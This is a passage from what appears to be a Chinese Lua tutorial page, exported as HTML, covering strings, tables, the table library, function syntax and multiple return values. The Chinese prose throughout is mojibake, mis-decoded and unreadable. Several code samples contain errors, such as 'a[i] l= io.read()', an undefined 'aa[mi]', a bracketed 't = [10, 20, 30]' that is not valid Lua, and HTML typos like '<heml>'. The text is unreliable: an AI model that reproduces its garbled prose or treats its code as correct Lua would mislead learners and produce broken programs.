è¯­è¨€ä¸­çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸²å­—èŠ‚ç»„æˆçš„åºåˆ—.</p><p>å­—ç¬¦ä½¿ç”¨ 8 ä¸ªæ¯”ç‰¹ä½æ¥å­˜å‚¨.</p><p>Lua è¯­è¨€çš„å­—ç¬¦ä¸²æ˜¯ä¸å¯å˜å€¼ (immutable value), ä¸èƒ½åƒ C è¯­è¨€ä¸­é‚£æ ·ç›´æ¥ä¿®æ”¹æŸä¸ªå­—ç¬¦ä¸²ä¸­çš„æŸä¸ªå­—ç¬¦. ä½†å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªæ–°å­—ç¬¦ä¸²çš„æ–¹å¼æ¥è¾¾åˆ°ä¿®æ”¹çš„ç›®çš„:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua">a = <span class="hljs-string">&quot;one string&quot;</span><br>b = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">gsub</span>(a, <span class="hljs-string">&quot;one&quot;</span>, <span class="hljs-string">&quot;another&quot;</span>)<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-built_in">print</span>(b)<br></code></pre></td></tr></table></figure><p>è·å–å­—ç¬¦ä¸²é•¿åº¦, ä½¿ç”¨ <code>#</code> é•¿åº¦æ“ä½œç¬¦:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua">a = <span class="hljs-string">&quot;hello&quot;</span><br><span class="hljs-built_in">print</span>(#a)<br><span class="hljs-built_in">print</span>(#<span class="hljs-string">&quot;good bye&quot;</span>)<br></code></pre></td></tr></table></figure><p>è¿”å›å­—ç¬¦ä¸²å ç”¨çš„å­—èŠ‚æ•°.</p><p>è¿æ¥æ“ä½œç¬¦ <code>..</code></p><h2 id="4-1-å­—ç¬¦ä¸²å¸¸é‡"><a href="#4-1-å­—ç¬¦ä¸²å¸¸é‡" class="headerlink" title="4.1 å­—ç¬¦ä¸²å¸¸é‡"></a>4.1 å­—ç¬¦ä¸²å¸¸é‡</h2><p>åŒå¼•å·å’Œå•å¼•å·æ˜¯ç­‰ä»·çš„.</p><p>æ”¯æŒ C è¯­è¨€é£æ ¼çš„è½¬ä¹‰å­—ç¬¦:</p><p><img src="/../img/lua_escape_characters.png"></p><h2 id="4-2-é•¿å­—ç¬¦ä¸²-x2F-å¤šè¡Œå­—ç¬¦ä¸²"><a href="#4-2-é•¿å­—ç¬¦ä¸²-x2F-å¤šè¡Œå­—ç¬¦ä¸²" class="headerlink" title="4.2 é•¿å­—ç¬¦ä¸²&#x2F;å¤šè¡Œå­—ç¬¦ä¸²"></a>4.2 é•¿å­—ç¬¦ä¸²&#x2F;å¤šè¡Œå­—ç¬¦ä¸²</h2><p>ä½¿ç”¨ä¸€å¯¹åŒæ–¹æ‹¬å·æ¥å£°æ˜é•¿å­—ç¬¦ä¸²&#x2F;å¤šè¡Œå­—ç¬¦ä¸²å¸¸é‡:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs lua">page = <span class="hljs-string">[[</span><br><span class="hljs-string">&lt;heml&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">  &lt;title&gt;An HTML Page&lt;/title&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">  &lt;a hred=&quot;http://www.lua.org&quot;&gt;Lua&lt;/a&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">]]</span><br><br><span class="hljs-built_in">write</span>(page)<br></code></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²ä¸­é‡åˆ° <code>a=b[c[i]]</code> çš„å¤„ç†æ–¹æ³•, å·¦æ–¹æ‹¬å·å˜ä¸º <code>[===[</code>, å³åœ¨ä¸¤ä¸ªå·¦æ–¹æ‹¬å·ä¹‹é—´åŠ ä¸Šä»»æ„æ•°é‡çš„ç­‰å·, è¿™æ ·åªæœ‰é‡åˆ°äº†åŒ…å«ç›¸åŒæ•°é‡ç­‰å·çš„ä¸¤ä¸ªå³æ–¹æ‹¬å·æ—¶æ‰ä¼šç»“æŸ. è¯¥æ–¹æ³•å¯¹æ³¨é‡ŠåŒæ ·æœ‰æ•ˆ.</p><h2 id="4-3-å¼ºåˆ¶ç±»å‹è½¬æ¢"><a href="#4-3-å¼ºåˆ¶ç±»å‹è½¬æ¢" class="headerlink" title="4.3 å¼ºåˆ¶ç±»å‹è½¬æ¢"></a>4.3 å¼ºåˆ¶ç±»å‹è½¬æ¢</h2><p>æœ€å¥½ä¸ä¾èµ–è‡ªåŠ¨è½¬æ¢.</p><p>ä½¿ç”¨ <code>tonumber()</code>, <code>tostring()</code> ç­‰å‡½æ•°.</p><h2 id="4-4-å­—ç¬¦ä¸²æ ‡å‡†åº“"><a href="#4-4-å­—ç¬¦ä¸²æ ‡å‡†åº“" class="headerlink" title="4.4 å­—ç¬¦ä¸²æ ‡å‡†åº“"></a>4.4 å­—ç¬¦ä¸²æ ‡å‡†åº“</h2><p>å¦‚:</p><ul><li><code>string.len()</code></li><li><code>string.rep()</code>, é‡å¤</li><li><code>string.reverse()</code></li><li><code>string.lower()</code></li><li><code>string.upper()</code></li><li><code>string.sub()</code>, ä¸ä¼šæ”¹å˜åŸæœ‰å­—ç¬¦ä¸²çš„å€¼, æŒ‡æŒ¥è¿”å›ä¸€ä¸ªæ–°å­—ç¬¦ä¸²</li><li><code>string.char()</code></li><li><code>string.byte()</code></li><li><code>string.format()</code></li><li><code>string.find(&quot;hello world&quot;, &quot;wor&quot;)</code>, è¿”å›æ¨¡å¼çš„å¼€å§‹å’Œç»“æŸä½ç½®</li><li><code>string.gsub()</code></li></ul><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ lua<br>&gt; string.format(<span class="hljs-string">&quot;x = %d  y = %d&quot;</span>, 10, 20)<br></code></pre></td></tr></table></figure><p>å¯ç”¨å†’å·æ“ä½œç¬¦ <code>:</code> ç›´æ¥è°ƒç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ lua<br>&gt; string.sub(s,i,j)<br>&gt; -- ç­‰ä»·äº<br>&gt; s:sub(i,j)<br></code></pre></td></tr></table></figure><h2 id="4-5-Unicode-ç¼–ç "><a href="#4-5-Unicode-ç¼–ç " class="headerlink" title="4.5 Unicode ç¼–ç "></a>4.5 Unicode ç¼–ç </h2><h1 id="5-è¡¨-table"><a href="#5-è¡¨-table" class="headerlink" title="5 è¡¨ (table)"></a>5 è¡¨ (table)</h1><p>è¡¨ (table) æ˜¯ Lua è¯­è¨€ä¸­æœ€ä¸»è¦ (äº‹å®ä¸Šä¹Ÿæ˜¯å”¯ä¸€çš„) æ•°æ®ç»“æ„.</p><p>è°ƒç”¨å‡½æ•° <code>math.sin</code> å¯¹äº Lua è¯­è¨€æ¥è¯´, å…¶å®é™…å«ä¹‰æ˜¯: ä»¥å­—ç¬¦ä¸² â€œsinâ€ ä¸ºé”®æ£€ç´¢è¡¨ math.</p><h2 id="5-1-è¡¨ç´¢å¼•"><a href="#5-1-è¡¨ç´¢å¼•" class="headerlink" title="5.1 è¡¨ç´¢å¼•"></a>5.1 è¡¨ç´¢å¼•</h2><p>åŒä¸€ä¸ªè¡¨ä¸­å­˜å‚¨çš„å€¼å¯ä»¥å…·æœ‰ä¸åŒçš„ç±»å‹ç´¢å¼•, å¹¶å¯ä»¥æŒ‰éœ€å¢é•¿ä»¥å®¹çº³æ–°çš„å…ƒç´ :</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ lua<br>&gt; a = &#123;&#125;<br>&gt; <span class="hljs-keyword">for</span> i = 1, 1000 <span class="hljs-keyword">do</span> a[i] = i*2 end<br>&gt; a[9]<br>&gt; a[<span class="hljs-string">&quot;x&quot;</span>] = 10<br></code></pre></td></tr></table></figure><p>å¯ä»¥æŠŠè¡¨å½“ç»“æ„ä½“ä½¿ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ lua<br>&gt; a.x = 10<br>&gt; -- ç­‰ä»·äº<br>&gt; a[<span class="hljs-string">&quot;x&quot;</span>] = 10<br></code></pre></td></tr></table></figure><h2 id="5-2-è¡¨æ„é€ å™¨"><a href="#5-2-è¡¨æ„é€ å™¨" class="headerlink" title="5.2 è¡¨æ„é€ å™¨"></a>5.2 è¡¨æ„é€ å™¨</h2><p>Table Constructor, ç”¨æ¥åˆ›å»ºå’Œåˆå§‹åŒ–è¡¨çš„è¡¨è¾¾å¼.</p><p>ç©ºæ„é€ å™¨: <code>&#123;&#125;</code></p><p>åˆå§‹åŒ–åˆ—è¡¨å¼:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua">days = &#123;<span class="hljs-string">&quot;Sunday&quot;</span>, <span class="hljs-string">&quot;Monday&quot;</span>, <span class="hljs-string">&quot;Tuesday&quot;</span>, <span class="hljs-string">&quot;Wednesday&quot;</span>, <span class="hljs-string">&quot;Thursday&quot;</span>, <span class="hljs-string">&quot;Friday&quot;</span>, <span class="hljs-string">&quot;Saturday&quot;</span>&#125;<br><br><span class="hljs-built_in">print</span>(days[<span class="hljs-number">4</span>]) <span class="hljs-comment">--&gt; Wednesday</span><br></code></pre></td></tr></table></figure><p>åˆå§‹åŒ–è®°å½•å¼ (record-like) è¡¨:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">a = &#123;x = <span class="hljs-number">10</span>, y = <span class="hljs-number">20</span>&#125;<br></code></pre></td></tr></table></figure><p>æ— è®ºä½¿ç”¨å“ªç§æ–¹å¼åˆ›å»ºè¡¨, éƒ½å¯ä»¥éšæ—¶å¢åŠ æˆ–åˆ é™¤è¡¨å…ƒç´ .</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua">w = &#123;x = <span class="hljs-number">0</span>, y = <span class="hljs-number">0</span>, label = <span class="hljs-string">&quot;console&quot;</span>&#125;<br>w.x = <span class="hljs-literal">nil</span>   <span class="hljs-comment">-- åˆ é™¤</span><br>w[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;another field&quot;</span> æŠŠé”® <span class="hljs-number">1</span> å¢åŠ åˆ°è¡¨ <span class="hljs-string">&#x27;w&#x27;</span> ä¸­<br></code></pre></td></tr></table></figure><p>æ··ç”¨:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs lua">polyline = &#123;color=<span class="hljs-string">&quot;blue&quot;</span>,<br>            thickness=<span class="hljs-number">2</span>,<br>            npoints=<span class="hljs-number">4</span>,<br>            &#123;x=<span class="hljs-number">0</span>,   y=<span class="hljs-number">0</span>&#125;,     <span class="hljs-comment">-- polyline[1]</span><br>            &#123;x=<span class="hljs-number">-10</span>, y=<span class="hljs-number">0</span>&#125;,     <span class="hljs-comment">-- polyline[2]</span><br>            &#123;x=<span class="hljs-number">-10</span>, y=<span class="hljs-number">1</span>&#125;,     <span class="hljs-comment">-- polyline[3]</span><br>            &#123;x=<span class="hljs-number">0</span>,   y=<span class="hljs-number">1</span>&#125;,     <span class="hljs-comment">-- polyline[4]</span><br><br><br>&#125;<br></code></pre></td></tr></table></figure><p>æ›´åŠ é€šç”¨çš„æ„é€ å™¨, é€šè¿‡æ–¹æ‹¬å·æ‹¬èµ·æ¥çš„è¡¨è¾¾å¼æ˜¾å¼æŒ‡å®šæ¯ä¸€ä¸ªç´¢å¼•:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">opnames = &#123;[<span class="hljs-string">&quot;+&quot;</span>] = <span class="hljs-string">&quot;add&quot;</span>, [<span class="hljs-string">&quot;-&quot;</span>] = <span class="hljs-string">&quot;sub&quot;</span>,<br>           [<span class="hljs-string">&quot;*&quot;</span>] = <span class="hljs-string">&quot;mul&quot;</span>, [<span class="hljs-string">&quot;/&quot;</span>] = <span class="hljs-string">&quot;div&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-3-æ•°ç»„-åˆ—è¡¨å’Œåºåˆ—"><a href="#5-3-æ•°ç»„-åˆ—è¡¨å’Œåºåˆ—" class="headerlink" title="5.3 æ•°ç»„, åˆ—è¡¨å’Œåºåˆ—"></a>5.3 æ•°ç»„, åˆ—è¡¨å’Œåºåˆ—</h2><p>ä½¿ç”¨æ•´å‹ä½œä¸ºç´¢å¼•çš„è¡¨, ä¸éœ€è¦é¢„å…ˆå£°æ˜è¡¨çš„å¤§å°:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua">a = &#123;&#125;<br><span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, <span class="hljs-number">10</span> <span class="hljs-keyword">do</span><br>    a[i] l= <span class="hljs-built_in">io</span>.<span class="hljs-built_in">read</span>()<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>Lua ä¸­, æ•°ç»„çš„ç´¢å¼•ä» 1 å¼€å§‹.</p><p>é€šå¸¸, æŠŠ<mark>åˆ—è¡¨çš„é•¿åº¦</mark>ä¿å­˜åœ¨è¡¨ä¸­æŸä¸ªéæ•°å€¼ç±»å‹çš„å­—æ®µä¸­, ç”±äºå†å²åŸå› , è¿™ä¸ªé”®é€šå¸¸æ˜¯ â€œnâ€.</p><p>å¯ä»¥ç”¨ <code>nil</code> å€¼æ¥æ ‡è®°åˆ—è¡¨çš„ç»“æŸ.</p><p><code>#</code> æ“ä½œç¬¦ä¹Ÿå¯ä»¥è·å–åˆ—è¡¨é•¿åº¦.</p><p>å¯¹äº Lua è¯­è¨€è€Œè¨€, ä¸€ä¸ªä¸º <code>nil</code> çš„å­—æ®µå’Œä¸€ä¸ªä¸å­˜åœ¨çš„å…ƒç´ æ²¡æœ‰åŒºåˆ«:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">a = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>&#125;<br></code></pre></td></tr></table></figure><p>é•¿åº¦ä¸º 3 è€Œä¸æ˜¯ 5.</p><p>å¤„ç†å­˜åœ¨ç©ºæ´çš„åˆ—è¡¨æ—¶, åº”è¯¥å°†åˆ—è¡¨çš„é•¿åº¦æ˜¾å¼åœ°ä¿å­˜èµ·æ¥.</p><h2 id="5-4-éå†è¡¨"><a href="#5-4-éå†è¡¨" class="headerlink" title="5.4 éå†è¡¨"></a>5.4 éå†è¡¨</h2><p><code>pairs</code> è¿­ä»£å™¨, å¯å¾—åˆ°è¡¨ä¸­çš„é”®å€¼å¯¹:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua">t = &#123;<span class="hljs-number">10</span>, <span class="hljs-built_in">print</span>, x = <span class="hljs-number">12</span>, k = <span class="hljs-string">&quot;hi&quot;</span>&#125;<br><span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>(t) <span class="hljs-keyword">do</span> <br>    <span class="hljs-built_in">print</span>(k, v)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>å—é™äºè¡¨åœ¨ Lua è¯­è¨€ä¸­çš„åº•å±‚å®ç°æœºåˆ¶, éå†è¿‡ç¨‹ä¸­<mark>å…ƒç´ çš„å‡ºç°é¡ºåºå¯èƒ½æ˜¯éšæœºçš„</mark>.</p><p>å¯¹äºåˆ—è¡¨ (ä¸Šé¢çš„ä¸ç®—æ˜¯åˆ—è¡¨) å¯ä½¿ç”¨ <code>ipairs</code> è¿­ä»£å™¨, å¯ä»¥ä¿è¯æŒ‰ç…§é¡ºåº.</p><p><code>for</code> å¾ªç¯éå†:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua">t = &#123;<span class="hljs-number">10</span>, <span class="hljs-built_in">print</span>, <span class="hljs-number">12</span>, <span class="hljs-string">&quot;hi&quot;</span>&#125;<br><span class="hljs-keyword">for</span> k = <span class="hljs-number">1</span>, #t <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">print</span>(k, t[k])<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h2 id="5-5-å®‰å…¨è®¿é—®"><a href="#5-5-å®‰å…¨è®¿é—®" class="headerlink" title="5.5 å®‰å…¨è®¿é—®"></a>5.5 å®‰å…¨è®¿é—®</h2><p>Lua æ²¡æœ‰å®‰å…¨è®¿é—®æ“ä½œç¬¦.</p><p><code>a or &#123;&#125;</code> å½“ <code>a</code> ä¸º <code>nil</code> æ—¶å…¶ç»“æœæ˜¯ä¸€ä¸ªç©ºè¡¨, å¯¹äºè¡¨è¾¾å¼ <code>(a or &#123;&#125;).b</code>, å½“ <code>a</code> ä¸º <code>nil</code> æ—¶å…¶ç»“æœä¹ŸåŒæ ·æ˜¯ <code>nil</code>.</p><h2 id="5-6-è¡¨æ ‡å‡†åº“"><a href="#5-6-è¡¨æ ‡å‡†åº“" class="headerlink" title="5.6 è¡¨æ ‡å‡†åº“"></a>5.6 è¡¨æ ‡å‡†åº“</h2><h3 id="table-insert"><a href="#table-insert" class="headerlink" title="table.insert"></a>table.insert</h3><p>å‘åºåˆ—æŒ‡å®šä½ç½®æ’å…¥ä¸€ä¸ªå…ƒç´ , ä¸æŒ‡å®šä½ç½®æ—¶åœ¨åºåˆ—çš„æœ€åæ’å…¥:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua">t = [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>]<br><span class="hljs-built_in">table</span>.<span class="hljs-built_in">insert</span>(t,<span class="hljs-number">1</span>,<span class="hljs-number">15</span>)<br><span class="hljs-comment">-- t å˜ä¸º [15,10,20,30]</span><br></code></pre></td></tr></table></figure><p>å¦ä¸€ä¸ªä¾‹å­:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua">t = &#123;&#125;<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">io</span>.<span class="hljs-built_in">lines</span>() <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">table</span>.<span class="hljs-built_in">insert</span>(t, line)<br><span class="hljs-keyword">end</span><br><span class="hljs-built_in">print</span>(#t)<br></code></pre></td></tr></table></figure><h3 id="table-remove"><a href="#table-remove" class="headerlink" title="table.remove"></a>table.remove</h3><p>åˆ é™¤å¹¶è¿”å›åºåˆ—æŒ‡å®šä½ç½®çš„å…ƒç´ , ç„¶åå°†å…¶åçš„å…ƒç´ å‘å‰è±«ä¸œå¡«å……åˆ é™¤å…ƒç´ åé€ æˆçš„ç©ºæ´.</p><p>ä¸æŒ‡å®šä½ç½®åˆ™åˆ é™¤æœ€åä¸€ä¸ª.</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">table</span>.<span class="hljs-built_in">remove</span>(t,<span class="hljs-number">1</span>)<br><span class="hljs-built_in">table</span>.<span class="hljs-built_in">remove</span>(t)<br></code></pre></td></tr></table></figure><h3 id="table-move"><a href="#table-move" class="headerlink" title="table.move"></a>table.move</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">table</span>.move(a,f,e,t)<br></code></pre></td></tr></table></figure><p>å°†è¡¨ <code>a</code> ä¸­ä»ç´¢å¼• f åˆ° e çš„å…ƒç´ ç§»åŠ¨åˆ°ä½ç½® t ä¸Š:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">table</span>.move(a, <span class="hljs-number">1</span>, #a, <span class="hljs-number">2</span>)<br>a[<span class="hljs-number">1</span>] = newElement<br><span class="hljs-built_in">table</span>.move(a, <span class="hljs-number">2</span>, #a, <span class="hljs-number">1</span>)<br>a[#a] = <span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><p><code>table.move</code> è¿˜æ”¯æŒä½¿ç”¨ä¸€ä¸ªè¡¨ä½œä¸ºå¯é€‰å‚æ•°, å³å°†ç¬¬ä¸€ä¸ªè¡¨ä¸­çš„å…ƒç´ ç§»åŠ¨åˆ°ç¬¬äºŒä¸ªè¡¨ä¸­.</p><h1 id="6-å‡½æ•°"><a href="#6-å‡½æ•°" class="headerlink" title="6 å‡½æ•°"></a>6 å‡½æ•°</h1><p>æ— è®ºå“ªç§æƒ…å†µ, å‡½æ•°è°ƒç”¨æ—¶éƒ½éœ€è¦ä½¿ç”¨ä¸€å¯¹åœ†æ‹¬å·æŠŠå‚æ•°åˆ—è¡¨æ‹¬èµ·æ¥.</p><p><mark>ä¾‹å¤–</mark> å½“å‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°ä¸”è¯¥å‚æ•°æ˜¯å­—ç¬¦ä¸²å¸¸é‡æˆ–è¡¨æ„é€ å™¨:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Hello World&quot;</span><br><span class="hljs-built_in">dofile</span> <span class="hljs-string">&#x27;a.lua&#x27;</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">[[a multi-line</span><br><span class="hljs-string">    message]]</span><br>f&#123;x=<span class="hljs-number">10</span>, y=<span class="hljs-number">20</span>&#125;<br><span class="hljs-built_in">type</span>&#123;&#125;<br></code></pre></td></tr></table></figure><p>Lua ä¸ºé¢å‘å¯¹è±¡æä¾›çš„ç‰¹æ®Šè¯­æ³•, å†’å·æ“ä½œç¬¦ <code>:</code></p><p>å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">o:foo(x)    <span class="hljs-comment">-- è°ƒç”¨å¯¹è±¡ o çš„ foo æ–¹æ³•  </span><br></code></pre></td></tr></table></figure><p>Lua è¯­è¨€æ ‡å‡†åº“ä¸­æ‰€æœ‰çš„å‡½æ•°éƒ½æ˜¯ä½¿ç”¨ C è¯­è¨€ç¼–å†™çš„.</p><p><mark>å‡½æ•°è¯­æ³•æ ¼å¼</mark> :</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span><span class="hljs-params">(a)</span></span><br>    <span class="hljs-keyword">local</span> sum = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, #a <span class="hljs-keyword">do</span><br>        sum = sum + a[i]<br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">return</span> sum<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>å‚æ•°çš„è¡Œä¸º<mark>ä¸å±€éƒ¨å˜é‡çš„è¡Œä¸ºå®Œå…¨ä¸€è‡´</mark>, ç›¸å½“äºä¸€ä¸ªç”¨å‡½æ•°è°ƒç”¨æ—¶ä¼ å…¥çš„å€¼è¿›è¡Œåˆå§‹åŒ–çš„å±€éƒ¨å˜é‡.</p><p>è°ƒç”¨å‡½æ•°æ—¶ä½¿ç”¨çš„å‚æ•°ä¸ªæ•°å¯ä»¥ä¸å®šä¹‰å‡½æ•°æ—¶ä½¿ç”¨çš„å‚æ•°ä¸ä¸€è‡´.</p><p>Lua è¯­è¨€ä¼šé€šè¿‡æŠ›å¼ƒå¤šä½™å‚æ•°å’Œå°†ä¸è¶³çš„å‚æ•°è®¾ä¸º <code>nil</code> çš„æ–¹å¼æ¥è°ƒæ•´å‚æ•°çš„ä¸ªæ•°.</p><p><mark>é»˜è®¤å‚æ•°</mark>:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">incCount</span><span class="hljs-params">(n)</span></span><br>    n = n <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><br>    globalCounter = globalCounter + n<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>n</code> çš„é»˜è®¤å€¼ç›¸å½“äºå°±æ˜¯ 1.</p><h2 id="6-1-å¤šè¿”å›å€¼"><a href="#6-1-å¤šè¿”å›å€¼" class="headerlink" title="6.1 å¤šè¿”å›å€¼"></a>6.1 å¤šè¿”å›å€¼</h2><p>Lua å…è®¸ä¸€ä¸ªå‡½æ•°è¿”å›å¤šä¸ªç»“æœ.</p><p>åœ¨ <code>return</code> ååˆ—å‡ºæ‰€æœ‰è¦è¿”å›çš„å€¼å³å¯:</p><p>å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">maximum</span><span class="hljs-params">(a)</span></span><br>    <span class="hljs-keyword">local</span> mi = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">local</span> m = aa[mi]<br>    <span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, #a <span class="hljs-keyword">do</span><br>        <span class="hljs-keyword">if</span> a[i] &gt; m <span class="hljs-keyword">then</span><br>            mi = i; m = a[i]<br>        <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">return</span> m, mi <br><span class="hljs-keyword">end</span><br><br><span class="hljs-built_in">print</span>(maximum(&#123;<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">23</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>&#125;))<br></code></pre></td></tr></table></figure><p>åœ¨å¤šé‡èµ‹å€¼ä¸­, å¦‚æœä¸€ä¸ªå‡½æ•°æ²¡æœ‰è¿”å›å€¼æˆ–è€…è¿”å›å€¼ä¸ªæ•°ä¸å¤Ÿå¤š, é‚£ä¹ˆ Lua è¯­è¨€ä¼šç”¨ <code>nil</code> æ¥è¡¥å……ç¼ºå¤±çš„å€¼:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">x,y,z = foo()   <span class="hljs-comment">-- x=&quot;a&quot;, y=&quot;b&quot;, z=nil</span><br></code></pre></td></tr></table></figure><p><mark>æ³¨æ„</mark>, åªæœ‰å½“å‡½æ•°è°ƒç”¨æ˜¯ä¸€ç³»åˆ—è¡¨è¾¾å¼ä¸­çš„æœ€åä¸€ä¸ªè¡¨è¾¾å¼æ—¶æ‰èƒ½è¿”å›å¤šå€¼ç»“æœ, å¦åˆ™åªèƒ½è¿”å›ä¸€ä¸ªç»“æœ.</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span 